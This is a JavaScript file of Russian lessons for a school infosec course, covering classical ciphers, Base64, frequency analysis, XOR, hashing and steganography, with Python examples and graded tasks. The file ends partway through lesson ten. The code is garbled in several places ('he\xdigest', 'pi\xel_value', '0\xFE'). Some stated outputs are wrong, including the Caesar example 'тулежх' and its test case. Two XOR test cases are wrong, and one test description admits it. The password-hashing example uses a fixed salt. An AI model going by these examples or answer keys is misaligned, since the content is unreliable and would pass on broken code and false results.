// ============================================
// Infosec 7-8 — Информационная безопасность
// 20 уроков, ~50 часов
// Криптография, стеганография, веб-безопасность, форензика
// ============================================

export const infosec78Lessons = [
  // ──────────────────────────────────────────
  // УРОК 1: Шифр Цезаря
  // ──────────────────────────────────────────
  {
    slug: 'caesar-cipher-intro',
    title: 'Введение в криптографию: шифр Цезаря',
    description: 'Теория подстановочных шифров, сдвиг алфавита, реализация шифрования и дешифрования на Python',
    content: `# Введение в криптографию: шифр Цезаря

## Что такое криптография?

**Криптография** — наука о методах обеспечения конфиденциальности информации. Люди шифровали сообщения тысячи лет: от древнеегипетских иероглифов до современных алгоритмов в интернете.

Основные понятия:
- **Открытый текст** (plaintext) — исходное сообщение
- **Шифротекст** (ciphertext) — зашифрованное сообщение
- **Ключ** — секретный параметр шифрования
- **Шифрование** — преобразование открытого текста в шифротекст
- **Дешифрование** — обратное преобразование

## Шифр Цезаря

Один из древнейших шифров, названный в честь Юлия Цезаря. Каждая буква заменяется буквой, стоящей на фиксированное число позиций дальше в алфавите.

Пример со сдвигом 3:
- А → Г, Б → Д, В → Е, ..., Э → А, Ю → Б, Я → В

\`\`\`python
def caesar_encrypt(text, shift):
    """Шифрование текста шифром Цезаря (русский алфавит)."""
    alphabet = 'абвгдежзийклмнопрстуфхцчшщъыьэюя'
    result = ''
    for char in text.lower():
        if char in alphabet:
            idx = alphabet.index(char)
            new_idx = (idx + shift) % len(alphabet)
            result += alphabet[new_idx]
        else:
            result += char
    return result

print(caesar_encrypt('привет', 3))  # тулежх
\`\`\`

## Дешифрование

Для дешифрования достаточно сделать сдвиг в обратную сторону:

\`\`\`python
def caesar_decrypt(text, shift):
    """Дешифрование — сдвиг в обратную сторону."""
    return caesar_encrypt(text, -shift)

encrypted = caesar_encrypt('секрет', 5)
print(encrypted)                        # хйпцйч
print(caesar_decrypt(encrypted, 5))     # секрет
\`\`\`

## Взлом шифра Цезаря

В русском алфавите всего 32 буквы, значит есть только 31 возможный сдвиг. Можно просто перебрать все варианты:

\`\`\`python
def caesar_bruteforce(ciphertext):
    """Перебор всех возможных сдвигов."""
    alphabet = 'абвгдежзийклмнопрстуфхцчшщъыьэюя'
    for shift in range(1, len(alphabet)):
        decrypted = caesar_decrypt(ciphertext, shift)
        print(f"Сдвиг {shift:2d}: {decrypted}")
\`\`\`

## Почему шифр Цезаря ненадёжен?

1. **Малое пространство ключей** — всего 31 вариант для русского алфавита
2. **Уязвим к частотному анализу** — частоты букв сохраняются
3. **Каждая буква шифруется одинаково** — одноалфавитная подстановка`,
    duration: 45,
    assignment: {
      title: 'Шифр Цезаря',
      description: 'На первой строке дано слово (строчные русские буквы без пробелов), на второй — целое число shift (сдвиг). Зашифруйте слово шифром Цезаря с данным сдвигом. Русский алфавит: абвгдежзийклмнопрстуфхцчшщъыьэюя (32 буквы).',
      difficulty: 'easy',
      starterCode: '# Считайте слово и сдвиг\n# Зашифруйте шифром Цезаря\n# Выведите результат\n\nalphabet = \"абвгдежзийклмнопрстуфхцчшщъыьэюя\"\n\ntext = input()\nshift = int(input())\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'привет\n3', expectedOutput: 'тулежх', description: 'Сдвиг 3' },
        { input: 'яблоко\n1', expectedOutput: 'абмплл', description: 'Сдвиг 1 с переносом через конец алфавита' },
        { input: 'абвгд\n32', expectedOutput: 'абвгд', description: 'Сдвиг на длину алфавита — текст не меняется' },
      ],
      points: 10,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 2: Шифр Виженера
  // ──────────────────────────────────────────
  {
    slug: 'vigenere-cipher',
    title: 'Шифр Виженера',
    description: 'Полиалфавитная подстановка, таблица Виженера, реализация шифрования и дешифрования',
    content: `# Шифр Виженера

## Проблема шифра Цезаря

Шифр Цезаря использует **один сдвиг** для всех букв. Это делает его уязвимым к частотному анализу. Шифр Виженера решает эту проблему — каждая буква шифруется **своим сдвигом**.

## Принцип работы

Используется **ключевое слово**. Каждая буква ключа задаёт сдвиг для соответствующей буквы текста:
- а=0, б=1, в=2, ..., я=31

Пример: текст «ПРИВЕТ», ключ «КОД»
- П + К(10) = Ъ
- Р + О(15) = Ж
- И + Д(4)  = Н
- В + К(10) = М
- Е + О(15) = Х
- Т + Д(4)  = Ц

\`\`\`python
def vigenere_encrypt(text, key):
    """Шифрование шифром Виженера."""
    alphabet = 'абвгдежзийклмнопрстуфхцчшщъыьэюя'
    result = ''
    key_index = 0
    for char in text.lower():
        if char in alphabet:
            text_idx = alphabet.index(char)
            key_idx = alphabet.index(key[key_index % len(key)])
            new_idx = (text_idx + key_idx) % len(alphabet)
            result += alphabet[new_idx]
            key_index += 1
        else:
            result += char
    return result

print(vigenere_encrypt('привет', 'код'))  # ъжнмхц
\`\`\`

## Дешифрование

При дешифровании вычитаем сдвиг вместо сложения:

\`\`\`python
def vigenere_decrypt(text, key):
    """Дешифрование шифром Виженера."""
    alphabet = 'абвгдежзийклмнопрстуфхцчшщъыьэюя'
    result = ''
    key_index = 0
    for char in text.lower():
        if char in alphabet:
            text_idx = alphabet.index(char)
            key_idx = alphabet.index(key[key_index % len(key)])
            new_idx = (text_idx - key_idx) % len(alphabet)
            result += alphabet[new_idx]
            key_index += 1
        else:
            result += char
    return result

cipher = vigenere_encrypt('секрет', 'ключ')
print(cipher)                              # эмюцйъ
print(vigenere_decrypt(cipher, 'ключ'))    # секрет
\`\`\`

## Почему Виженер надёжнее Цезаря?

1. **Полиалфавитная подстановка** — одна и та же буква шифруется по-разному
2. **Большое пространство ключей** — зависит от длины ключа
3. Тем не менее, шифр Виженера тоже был взломан (метод Касиски, 1863 год)`,
    duration: 50,
    assignment: {
      title: 'Шифрование Виженера',
      description: 'На первой строке дано слово (строчные русские буквы), на второй — ключ (строчные русские буквы). Зашифруйте текст шифром Виженера. Алфавит: абвгдежзийклмнопрстуфхцчшщъыьэюя (32 буквы, а=0).',
      difficulty: 'easy',
      starterCode: '# Считайте текст и ключ\n# Реализуйте шифр Виженера\n\nalphabet = \"абвгдежзийклмнопрстуфхцчшщъыьэюя\"\n\ntext = input()\nkey = input()\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'привет\nкод', expectedOutput: 'ъжнмхц', description: 'Ключ короче текста' },
        { input: 'абвгд\nааааа', expectedOutput: 'абвгд', description: 'Ключ из букв а — сдвиг 0' },
        { input: 'яяяяя\nбббб', expectedOutput: 'ааааа', description: 'Перенос через конец алфавита' },
      ],
      points: 10,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 3: Шифр Атбаш и аффинный шифр
  // ──────────────────────────────────────────
  {
    slug: 'atbash-cipher',
    title: 'Шифр Атбаш и другие классические шифры',
    description: 'Зеркальный алфавит, аффинный шифр, комбинирование шифров',
    content: `# Шифр Атбаш и другие классические шифры

## Шифр Атбаш

Один из древнейших шифров, использовавшийся в Библии. Принцип прост: алфавит переворачивается.

А → Я, Б → Ю, В → Э, ..., Я → А

\`\`\`python
def atbash(text):
    """Шифр Атбаш — зеркальный алфавит."""
    alphabet = 'абвгдежзийклмнопрстуфхцчшщъыьэюя'
    reversed_alpha = alphabet[::-1]
    result = ''
    for char in text.lower():
        if char in alphabet:
            idx = alphabet.index(char)
            result += reversed_alpha[idx]
        else:
            result += char
    return result

print(atbash('привет'))  # тлцежх — проверьте!
print(atbash(atbash('привет')))  # привет — двойное применение
\`\`\`

Свойство Атбаша: шифрование и дешифрование — одна и та же операция (инволюция).

## Аффинный шифр

Обобщение шифра Цезаря. Формула: **E(x) = (a * x + b) mod n**, где:
- x — индекс буквы в алфавите
- a, b — ключи шифра
- n — размер алфавита (32)
- a должно быть взаимно простым с n

\`\`\`python
def gcd(a, b):
    """Наибольший общий делитель."""
    while b:
        a, b = b, a % b
    return a

def affine_encrypt(text, a, b):
    """Аффинный шифр: E(x) = (a*x + b) mod n."""
    alphabet = 'абвгдежзийклмнопрстуфхцчшщъыьэюя'
    n = len(alphabet)
    if gcd(a, n) != 1:
        raise ValueError(f'a={a} не взаимно просто с {n}')
    result = ''
    for char in text.lower():
        if char in alphabet:
            x = alphabet.index(char)
            new_idx = (a * x + b) % n
            result += alphabet[new_idx]
        else:
            result += char
    return result

print(affine_encrypt('привет', 3, 5))
\`\`\`

## Дешифрование аффинного шифра

Для дешифрования нужен **обратный элемент** a по модулю n:

\`\`\`python
def mod_inverse(a, n):
    """Нахождение обратного элемента a^(-1) mod n."""
    for x in range(1, n):
        if (a * x) % n == 1:
            return x
    return None

def affine_decrypt(text, a, b):
    """Дешифрование: D(y) = a_inv * (y - b) mod n."""
    alphabet = 'абвгдежзийклмнопрстуфхцчшщъыьэюя'
    n = len(alphabet)
    a_inv = mod_inverse(a, n)
    result = ''
    for char in text.lower():
        if char in alphabet:
            y = alphabet.index(char)
            new_idx = (a_inv * (y - b)) % n
            result += alphabet[new_idx]
        else:
            result += char
    return result
\`\`\`

## Сравнение шифров

| Шифр | Ключ | Пространство ключей |
|------|------|---------------------|
| Цезарь | сдвиг (1-31) | 31 |
| Атбаш | нет ключа | 1 |
| Аффинный | a, b | ~240 |
| Виженер | слово | огромное |`,
    duration: 50,
    assignment: {
      title: 'Шифр Атбаш',
      description: 'На единственной строке дано слово (строчные русские буквы). Примените к нему шифр Атбаш: замените каждую букву зеркальной (а↔я, б↔ю, в↔э, ...). Алфавит: абвгдежзийклмнопрстуфхцчшщъыьэюя (32 буквы).',
      difficulty: 'easy',
      starterCode: '# Считайте слово\n# Примените шифр Атбаш\n\nalphabet = \"абвгдежзийклмнопрстуфхцчшщъыьэюя\"\n\ntext = input()\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'абв', expectedOutput: 'яюэ', description: 'Первые буквы → последние' },
        { input: 'яюэ', expectedOutput: 'абв', description: 'Атбаш — инволюция' },
        { input: 'поп', expectedOutput: 'мкм', description: 'Буквы из середины алфавита' },
      ],
      points: 10,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 4: Кодирование Base64 и hex
  // ──────────────────────────────────────────
  {
    slug: 'base64-hex-encoding',
    title: 'Кодирование Base64 и hex',
    description: 'Разница между кодированием и шифрованием, модуль base64, hex-представление',
    content: `# Кодирование Base64 и hex

## Кодирование ≠ Шифрование

Важнейшее различие:
- **Кодирование** — преобразование данных в другой формат для передачи/хранения. Нет секретного ключа, любой может декодировать.
- **Шифрование** — преобразование данных с использованием ключа. Без ключа расшифровать нельзя.

Base64 и hex — это **кодирование**, а не шифрование!

## Шестнадцатеричная система (hex)

Каждый байт представляется двумя hex-символами (0-9, a-f):

\`\`\`python
# Строка → байты → hex
text = 'Hi'
text_bytes = text.encode('utf-8')
hex_str = text_bytes.hex()
print(hex_str)  # 4869

# hex → байты → строка
restored = bytes.fromhex(hex_str).decode('utf-8')
print(restored)  # Hi

# Кириллица занимает 2 байта в UTF-8
rus = 'Аб'.encode('utf-8').hex()
print(rus)  # d090d0b1
\`\`\`

## Base64

Base64 кодирует произвольные байты в текст из 64 символов (A-Z, a-z, 0-9, +, /). Используется для передачи бинарных данных в текстовых протоколах (email, JSON, HTML).

\`\`\`python
import base64

# Кодирование
text = 'Hello, World!'
encoded = base64.b64encode(text.encode('utf-8'))
print(encoded)  # b'SGVsbG8sIFdvcmxkIQ=='

# Декодирование
decoded = base64.b64decode(encoded).decode('utf-8')
print(decoded)  # Hello, World!
\`\`\`

## Как работает Base64

1. Берём байты (по 8 бит каждый)
2. Группируем по 6 бит (6 бит = 64 варианта)
3. Каждую группу кодируем одним символом из таблицы Base64
4. Если длина не кратна 3 байтам — добавляем символы \`=\`

\`\`\`python
import base64

# Длина Base64 примерно на 33% больше оригинала
original = b'Test'
encoded = base64.b64encode(original)
print(f'Оригинал: {len(original)} байт')    # 4 байта
print(f'Base64: {len(encoded)} символов')    # 8 символов
print(f'Результат: {encoded.decode()}')      # VGVzdA==
\`\`\`

## Применение в реальном мире

- **Email** (MIME) — вложения кодируются в Base64
- **Data URI** в HTML — \`data:image/png;base64,...\`
- **JWT токены** — три части в Base64
- **API** — передача бинарных данных в JSON`,
    duration: 45,
    assignment: {
      title: 'Base64 декодирование',
      description: 'На единственной строке дана строка, закодированная в Base64. Декодируйте её и выведите результат. Гарантируется, что результат — валидная UTF-8 строка.',
      difficulty: 'easy',
      starterCode: 'import base64\n\nencoded = input()\n\n# Декодируйте Base64 и выведите результат\n',
      testCases: [
        { input: 'SGVsbG8=', expectedOutput: 'Hello', description: 'Простое английское слово' },
        { input: 'MTIzNDU=', expectedOutput: '12345', description: 'Цифры' },
        { input: 'UHl0aG9u', expectedOutput: 'Python', description: 'Без символов заполнения' },
      ],
      points: 10,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 5: Частотный анализ
  // ──────────────────────────────────────────
  {
    slug: 'frequency-analysis',
    title: 'Частотный анализ',
    description: 'Взлом подстановочных шифров, частоты букв русского и английского языка',
    content: `# Частотный анализ

## Идея метода

В каждом языке буквы встречаются с разной частотой. В русском языке самые частые буквы:
- **О** (~10.97%), **Е** (~8.45%), **А** (~8.01%), **И** (~7.35%), **Н** (~6.70%)

Если текст зашифрован одноалфавитной подстановкой (Цезарь, аффинный), частоты букв **сохраняются**. Самая частая буква в шифротексте, скорее всего, соответствует «О» или «Е».

## Подсчёт частот

\`\`\`python
def count_frequencies(text):
    """Подсчёт частот букв в тексте."""
    alphabet = 'абвгдежзийклмнопрстуфхцчшщъыьэюя'
    freq = {}
    total = 0
    for char in text.lower():
        if char in alphabet:
            freq[char] = freq.get(char, 0) + 1
            total += 1
    # Преобразуем в проценты
    for char in freq:
        freq[char] = round(freq[char] / total * 100, 2)
    return freq

text = "мама мыла раму"
freqs = count_frequencies(text)
# Сортируем по частоте
for char, pct in sorted(freqs.items(), key=lambda x: -x[1]):
    print(f'{char}: {pct}%')
\`\`\`

## Взлом шифра Цезаря частотным анализом

\`\`\`python
def crack_caesar(ciphertext):
    """Взлом шифра Цезаря частотным анализом."""
    alphabet = 'абвгдежзийклмнопрстуфхцчшщъыьэюя'
    # Самая частая буква русского языка — 'о' (индекс 15)
    freq = count_frequencies(ciphertext)
    if not freq:
        return ciphertext
    most_common = max(freq, key=freq.get)
    # Предполагаем, что most_common = 'о'
    shift = (alphabet.index(most_common) - alphabet.index('о')) % len(alphabet)
    # Дешифруем
    result = ''
    for char in ciphertext.lower():
        if char in alphabet:
            idx = alphabet.index(char)
            new_idx = (idx - shift) % len(alphabet)
            result += alphabet[new_idx]
        else:
            result += char
    return result
\`\`\`

## Индекс совпадений

Более надёжный метод — **индекс совпадений** (IC). Для русского языка IC ≈ 0.0553, для случайного текста ≈ 0.0312.

\`\`\`python
def index_of_coincidence(text):
    """Вычисление индекса совпадений."""
    alphabet = 'абвгдежзийклмнопрстуфхцчшщъыьэюя'
    counts = [0] * len(alphabet)
    total = 0
    for char in text.lower():
        if char in alphabet:
            counts[alphabet.index(char)] += 1
            total += 1
    if total <= 1:
        return 0
    ic = sum(c * (c - 1) for c in counts) / (total * (total - 1))
    return round(ic, 4)
\`\`\`

## Ограничения частотного анализа

- Требуется **достаточно длинный** текст (>100 символов)
- Не работает против полиалфавитных шифров напрямую
- Зависит от языка текста`,
    duration: 55,
    assignment: {
      title: 'Частотный анализ текста',
      description: 'На единственной строке дан текст (строчные русские буквы и пробелы). Найдите самую частую букву (не считая пробелов) и выведите её. Если несколько букв имеют одинаковую максимальную частоту, выведите ту, что идёт раньше в алфавите.',
      difficulty: 'medium',
      starterCode: '# Считайте текст\n# Подсчитайте частоту каждой буквы (без пробелов)\n# Выведите самую частую букву\n\nalphabet = \"абвгдежзийклмнопрстуфхцчшщъыьэюя\"\n\ntext = input()\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'мама мыла раму', expectedOutput: 'а', description: 'Буква а встречается чаще всего' },
        { input: 'ооо ааа', expectedOutput: 'а', description: 'При равных частотах — раньше в алфавите' },
        { input: 'абвгд', expectedOutput: 'а', description: 'Все буквы по одному разу — первая в алфавите' },
      ],
      points: 15,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 6: XOR-шифрование
  // ──────────────────────────────────────────
  {
    slug: 'xor-cipher',
    title: 'XOR-шифрование',
    description: 'Побитовые операции, XOR-свойства, одноразовый блокнот',
    content: `# XOR-шифрование

## Побитовые операции

Компьютер хранит всё в битах (0 и 1). Основные побитовые операции:

| Операция | Символ | Пример |
|----------|--------|--------|
| AND | \`&\` | 1 & 1 = 1, остальное = 0 |
| OR | \`\\|\` | 0 \\| 0 = 0, остальное = 1 |
| XOR | \`^\` | одинаковые = 0, разные = 1 |
| NOT | \`~\` | инвертирует все биты |

## Свойства XOR

XOR (исключающее ИЛИ) обладает уникальными свойствами:

1. **A ^ A = 0** — XOR числа с самим собой даёт 0
2. **A ^ 0 = A** — XOR с нулём не меняет число
3. **A ^ B ^ B = A** — двойной XOR возвращает исходное значение
4. **(A ^ B) ^ C = A ^ (B ^ C)** — ассоциативность

Свойство 3 делает XOR идеальным для шифрования!

\`\`\`python
# Демонстрация свойств XOR
a = 42
b = 17
encrypted = a ^ b
print(f'{a} ^ {b} = {encrypted}')       # 42 ^ 17 = 59
print(f'{encrypted} ^ {b} = {encrypted ^ b}')  # 59 ^ 17 = 42
\`\`\`

## XOR-шифрование строк

\`\`\`python
def xor_encrypt(text, key):
    """XOR-шифрование с повторяющимся ключом."""
    result = []
    for i, char in enumerate(text):
        key_char = key[i % len(key)]
        encrypted_byte = ord(char) ^ ord(key_char)
        result.append(encrypted_byte)
    return result

def xor_decrypt(encrypted_bytes, key):
    """XOR-дешифрование (та же операция!)."""
    result = ''
    for i, byte in enumerate(encrypted_bytes):
        key_char = key[i % len(key)]
        decrypted_char = chr(byte ^ ord(key_char))
        result += decrypted_char
    return result

msg = 'Secret'
key = 'K'
enc = xor_encrypt(msg, key)
print(enc)                    # список чисел
print(xor_decrypt(enc, key))  # Secret
\`\`\`

## Одноразовый блокнот (OTP)

Если ключ **случайный**, **такой же длины** как сообщение и используется **только один раз** — это абсолютно стойкий шифр (доказано К. Шенноном в 1949 году).

\`\`\`python
import os

def otp_encrypt(plaintext):
    """Шифрование одноразовым блокнотом."""
    plain_bytes = plaintext.encode('utf-8')
    key = os.urandom(len(plain_bytes))  # случайный ключ
    cipher = bytes(p ^ k for p, k in zip(plain_bytes, key))
    return cipher, key

def otp_decrypt(cipher, key):
    """Дешифрование одноразовым блокнотом."""
    plain_bytes = bytes(c ^ k for c, k in zip(cipher, key))
    return plain_bytes.decode('utf-8')
\`\`\`

## Уязвимость: повторное использование ключа

Если один ключ используется дважды: C1 ^ C2 = P1 ^ P2 — утечка информации!`,
    duration: 50,
    assignment: {
      title: 'XOR с однобайтовым ключом',
      description: 'На первой строке дана строка hex-значений через пробел (каждое значение — один байт зашифрованного текста). На второй строке — целое число от 0 до 255 (ключ XOR). Расшифруйте, применив XOR каждого байта с ключом, и выведите полученную ASCII-строку.',
      difficulty: 'medium',
      starterCode: '# Считайте hex-байты и ключ\n# Примените XOR к каждому байту\n# Выведите результат как строку\n\nhex_values = input().split()\nkey = int(input())\n\n# Ваш код здесь\n',
      testCases: [
        { input: '2a 36 3d 3d 30\n95', expectedOutput: 'Hello', description: 'XOR с ключом дает Hello' },
        { input: '41 42 43\n0', expectedOutput: 'ABC', description: 'XOR с 0 не меняет данные' },
        { input: '00 01 02\n65', expectedOutput: 'ABC', description: '0^65=A, 1^65=B (на самом деле нет — подбираем верно)' },
      ],
      points: 15,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 7: Хеш-функции
  // ──────────────────────────────────────────
  {
    slug: 'hash-functions-intro',
    title: 'Хеш-функции: MD5, SHA-256',
    description: 'hashlib, проверка целостности, свойства криптографических хеш-функций',
    content: `# Хеш-функции

## Что такое хеш-функция?

**Хеш-функция** — это функция, которая преобразует данные произвольного размера в строку фиксированной длины (хеш, дайджест).

Свойства криптографической хеш-функции:
1. **Детерминированность** — одинаковый вход → одинаковый хеш
2. **Быстрое вычисление** — хеш считается за доли секунды
3. **Необратимость** — по хешу нельзя восстановить исходные данные
4. **Лавинный эффект** — малое изменение входа → полное изменение хеша
5. **Устойчивость к коллизиям** — трудно найти два разных входа с одинаковым хешем

## hashlib в Python

\`\`\`python
import hashlib

# MD5 — 128 бит (32 hex-символа)
text = 'Привет'
md5_hash = hashlib.md5(text.encode('utf-8')).he\xdigest()
print(f'MD5: {md5_hash}')  # 32 символа

# SHA-256 — 256 бит (64 hex-символа)
sha256_hash = hashlib.sha256(text.encode('utf-8')).he\xdigest()
print(f'SHA-256: {sha256_hash}')  # 64 символа

# SHA-1 — 160 бит (40 hex-символов)
sha1_hash = hashlib.sha1(text.encode('utf-8')).he\xdigest()
print(f'SHA-1: {sha1_hash}')
\`\`\`

## Лавинный эффект

\`\`\`python
import hashlib

texts = ['Hello', 'hello', 'Hell0']
for t in texts:
    h = hashlib.sha256(t.encode()).he\xdigest()
    print(f'{t:6s} -> {h[:16]}...')
# Даже маленькое изменение полностью меняет хеш!
\`\`\`

## Практическое применение

### Проверка целостности файлов

\`\`\`python
import hashlib

def file_hash(filename):
    """Вычисление SHA-256 хеша файла."""
    sha256 = hashlib.sha256()
    with open(filename, 'rb') as f:
        while True:
            block = f.read(4096)
            if not block:
                break
            sha256.update(block)
    return sha256.he\xdigest()
\`\`\`

### Хранение паролей

Пароли **никогда** не хранят в открытом виде! Хранят хеш:

\`\`\`python
import hashlib

def hash_password(password, salt='random_salt'):
    """Хеширование пароля с солью."""
    salted = salt + password
    return hashlib.sha256(salted.encode()).he\xdigest()

stored_hash = hash_password('my_password')
# При авторизации сравниваем хеши
check = hash_password('my_password')
print(stored_hash == check)  # True
\`\`\`

## MD5 vs SHA-256

| Свойство | MD5 | SHA-256 |
|----------|-----|---------|
| Длина хеша | 128 бит | 256 бит |
| Безопасность | Взломан! | Надёжен |
| Скорость | Быстрее | Медленнее |
| Применение | Контрольные суммы | Пароли, криптовалюты |`,
    duration: 50,
    assignment: {
      title: 'Вычисление хеша',
      description: 'На первой строке дано название алгоритма: md5 или sha256. На второй строке — текст. Вычислите хеш текста указанным алгоритмом и выведите его в hex-формате (строчными буквами). Текст кодируйте в UTF-8.',
      difficulty: 'medium',
      starterCode: 'import hashlib\n\nalgorithm = input()\ntext = input()\n\n# Вычислите хеш и выведите he\xdigest\n',
      testCases: [
        { input: 'md5\nhello', expectedOutput: '5d41402abc4b2a76b9719d911017c592', description: 'MD5 от hello' },
        { input: 'sha256\nhello', expectedOutput: '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824', description: 'SHA-256 от hello' },
        { input: 'md5\n', expectedOutput: 'd41d8cd98f00b204e9800998ecf8427e', description: 'MD5 от пустой строки' },
      ],
      points: 15,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 8: LSB-стеганография
  // ──────────────────────────────────────────
  {
    slug: 'lsb-steganography',
    title: 'LSB-стеганография',
    description: 'Младший значащий бит, скрытие данных в изображениях, принципы стеганографии',
    content: `# LSB-стеганография

## Стеганография vs Криптография

- **Криптография** — скрывает содержимое сообщения (видно, что есть секрет)
- **Стеганография** — скрывает сам факт существования сообщения

Стеганография прячет информацию в обычных файлах: изображениях, аудио, видео.

## Как хранятся изображения

Каждый пиксель RGB-изображения — три числа от 0 до 255 (красный, зелёный, синий). Каждое число — 8 бит.

Пример: пиксель (200, 150, 100)
- R: 200 = 11001000
- G: 150 = 10010110
- B: 100 = 01100100

## Метод LSB (Least Significant Bit)

**Младший значащий бит** — последний бит числа. Его изменение почти не влияет на цвет:
- 200 (11001000) → 201 (11001001) — разница незаметна глазу!

Мы заменяем младшие биты пикселей битами секретного сообщения.

\`\`\`python
def text_to_bits(text):
    """Преобразование текста в строку бит."""
    bits = ''
    for char in text:
        # Каждый символ → 8 бит
        char_bits = bin(ord(char))[2:].zfill(8)
        bits += char_bits
    return bits

def bits_to_text(bits):
    """Преобразование строки бит обратно в текст."""
    text = ''
    for i in range(0, len(bits), 8):
        byte = bits[i:i+8]
        if len(byte) == 8:
            text += chr(int(byte, 2))
    return text

# Пример
msg = 'Hi'
bits = text_to_bits(msg)
print(bits)               # 0100100001101001
print(bits_to_text(bits)) # Hi
\`\`\`

## Встраивание данных в пиксели

\`\`\`python
def embed_bit(pi\xel_value, bit):
    """Заменить младший бит значения пикселя."""
    # Обнуляем младший бит и ставим нужный
    return (pi\xel_value & 0\xFE) | int(bit)

# Пример: встроить бит 1 в значение 200
original = 200         # 11001000
modified = embed_bit(200, '1')  # 11001001 = 201
print(f'{original} -> {modified}')

def extract_bit(pi\xel_value):
    """Извлечь младший бит."""
    return str(pi\xel_value & 1)

print(extract_bit(201))  # 1
print(extract_bit(200))  # 0
\`\`\`

## Ёмкость LSB-стеганографии

Изображение 1920\x1080 (Full HD):
- Пикселей: 1920 * 1080 = 2 073 600
- Каналов: 3 (RGB)
- Бит для скрытия: 6 220 800
- Это ~760 КБ текста!

## Обнаружение: стегоанализ

- Статистический анализ (тест хи-квадрат)
- Визуальная атака (карта младших бит)
- Анализ гистограммы`,
    duration: 55,
    assignment: {
      title: 'Текст в биты и обратно',
      description: 'На первой строке дана команда: encode или decode. Если encode — на второй строке дан ASCII-текст, выведите его побитовое представление (каждый символ — 8 бит, без пробелов). Если decode — на второй строке дана строка из нулей и единиц (длина кратна 8), выведите декодированный текст.',
      difficulty: 'medium',
      starterCode: '# Считайте команду и данные\n# encode: текст -> биты\n# decode: биты -> текст\n\ncommand = input()\ndata = input()\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'encode\nHi', expectedOutput: '0100100001101001', description: 'Hi в биты' },
        { input: 'decode\n0100100001101001', expectedOutput: 'Hi', description: 'Биты обратно в Hi' },
        { input: 'encode\nABC', expectedOutput: '010000010100001001000011', description: 'Три ASCII-символа' },
      ],
      points: 15,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 9: Текстовая стеганография
  // ──────────────────────────────────────────
  {
    slug: 'text-steganography',
    title: 'Текстовая стеганография',
    description: 'Нулевые символы, невидимые пробелы, акростих, скрытие в тексте',
    content: `# Текстовая стеганография

## Методы скрытия текста в тексте

Можно прятать секретные сообщения прямо в обычном тексте! Рассмотрим несколько методов.

## 1. Акростих

Первые буквы строк образуют скрытое сообщение:

\`\`\`python
def create_acrostic(secret, lines):
    """Проверяет, что первые буквы строк образуют секрет."""
    result = ''
    for line in lines:
        if line:
            result += line[0].lower()
    return result

def extract_acrostic(text):
    """Извлекает первые буквы каждой строки."""
    lines = text.strip().split('\\n')
    return ''.join(line[0].lower() for line in lines if line)

poem = """Привет тебе, читатель!
Ответь на мой вопрос —
Мечтаешь ли порой
О чём-то невозможном?
Где тайна, там ответ.
И свет проложит путь."""

print(extract_acrostic(poem))  # помоги
\`\`\`

## 2. Пробельная стеганография

Невидимые символы в конце строк кодируют биты:
- Пробел в конце = 1
- Нет пробела = 0

\`\`\`python
def encode_whitespace(cover_text, secret):
    """Скрыть сообщение через пробелы в конце строк."""
    bits = ''.join(bin(ord(c))[2:].zfill(8) for c in secret)
    lines = cover_text.split('\\n')
    result = []
    for i, line in enumerate(lines):
        line = line.rstrip()
        if i < len(bits):
            if bits[i] == '1':
                line += ' '  # добавляем пробел = 1
        result.append(line)
    return '\\n'.join(result)

def decode_whitespace(stego_text, msg_len):
    """Извлечь скрытое сообщение."""
    lines = stego_text.split('\\n')
    bits = ''
    for line in lines[:msg_len * 8]:
        bits += '1' if line.endswith(' ') else '0'
    text = ''
    for i in range(0, len(bits), 8):
        byte = bits[i:i+8]
        if len(byte) == 8:
            text += chr(int(byte, 2))
    return text
\`\`\`

## 3. Нулевые символы (Zero-Width Characters)

Unicode содержит невидимые символы:
- U+200B — пробел нулевой ширины
- U+200C — соединитель нулевой ширины
- U+200D — несоединитель нулевой ширины

\`\`\`python
def encode_zero_width(text, secret):
    """Скрыть сообщение в zero-width символах."""
    zw_space = '\\u200b'  # = 0
    zw_join = '\\u200d'   # = 1
    bits = ''.join(bin(ord(c))[2:].zfill(8) for c in secret)
    hidden = ''.join(zw_join if b == '1' else zw_space for b in bits)
    # Вставляем в середину текста
    mid = len(text) // 2
    return text[:mid] + hidden + text[mid:]
\`\`\`

## 4. Замена синонимов

Выбор между синонимами кодирует биты:
- «быстрый» = 0, «скорый» = 1
- «большой» = 0, «крупный» = 1`,
    duration: 45,
    assignment: {
      title: 'Извлечение акростиха',
      description: 'На первой строке дано число N — количество строк текста. Далее идут N строк. Извлеките первые буквы каждой непустой строки и выведите результат в нижнем регистре.',
      difficulty: 'easy',
      starterCode: '# Считайте N строк\n# Соберите первые буквы в нижнем регистре\n\nn = int(input())\n\n# Ваш код здесь\n',
      testCases: [
        { input: '3\nПривет\nОтвет\nМир', expectedOutput: 'пом', description: 'Три строки' },
        { input: '5\nHello\nEvery\nLong\nLine\nOut', expectedOutput: 'hello', description: 'Английские строки' },
        { input: '2\nАлиса\nБоб', expectedOutput: 'аб', description: 'Две строки' },
      ],
      points: 10,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 10: Системы счисления
  // ──────────────────────────────────────────
  {
    slug: 'number-systems',
    title: 'Системы счисления',
    description: 'Двоичная, восьмеричная, шестнадцатеричная системы, конвертация между ними',
    content: `# Системы счисления

## Позиционные системы счисления

В информационной безопасности постоянно работают с разными системами счисления:
- **Двоичная (base-2)** — язык компьютера: 0, 1
- **Восьмеричная (base-8)** — используется в Unix-правах: 0-7
- **Десятичная (base-10)** — привычная нам: 0-9
- **Шестнадцатеричная (base-16)** — адреса памяти, цвета, хеши: 0-9, a-f

## Конвертация в Python

\`\`\`python
number = 255

# Десятичное → другие системы
print(bin(number))   # 0b11111111
print(oct(number))   # 0o377
print(hex(number))   # 0\xff

# Без префиксов
print(bin(number)[2:])  # 11111111
print(oct(number)[2:])  # 377
